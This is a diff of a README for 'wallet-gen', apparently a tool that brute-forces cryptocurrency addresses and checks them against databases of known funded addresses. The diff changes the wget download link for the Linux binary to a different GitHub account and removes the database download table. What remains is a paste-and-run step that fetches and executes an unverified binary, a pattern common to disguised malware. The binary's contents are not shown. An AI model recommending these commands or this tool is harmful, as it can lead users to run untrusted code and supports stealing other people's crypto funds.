@@ -43,7 +43,7 @@ The software compares generated addresses against known address databases or che
 
 ## Linux (x86-64bit)
 ```bash
-wget https://github.com/cote-tony/wallet-gen/releases/download/wallet-gen/wallet-gen-linux-x64.tar.gz
+wget https://github.com/tony-seed/wallet-gen/releases/download/wallet-gen/wallet-gen-linux-x64.tar.gz
 tar -xzf  wallet-gen-linux-x64.tar.gz
 cd wallet-gen
 ./wallet-gen
@@ -66,14 +66,6 @@ cd wallet-gen
   <b>Linux</b><br>
   <img width="900" alt="Wallet-Gen Linux demo" src="/assets/wallet-gen-linux.png" />
 </p>
-
-
-
-### Download and Use Database (for more speed)
-| Database                                                     | Download link                                |  File Size                             | Number of Addresses  |
-|---------------------------------------------------------|------------------------------------------------|------------------------------------|----------------------------------|
-| BTC Database                                            | &nbsp;&nbsp;&nbsp;&nbsp;[btc_database.txt](../../releases/tag/database)  | 1.03 GB | &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;23 428 179
-| EVM Database                                            | &nbsp;&nbsp;&nbsp;&nbsp;[evm_database.txt](../../releases/tag/database)  | 1.02 GB | &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;25 999 700
 
 
 ## Wallet-Gen Finds
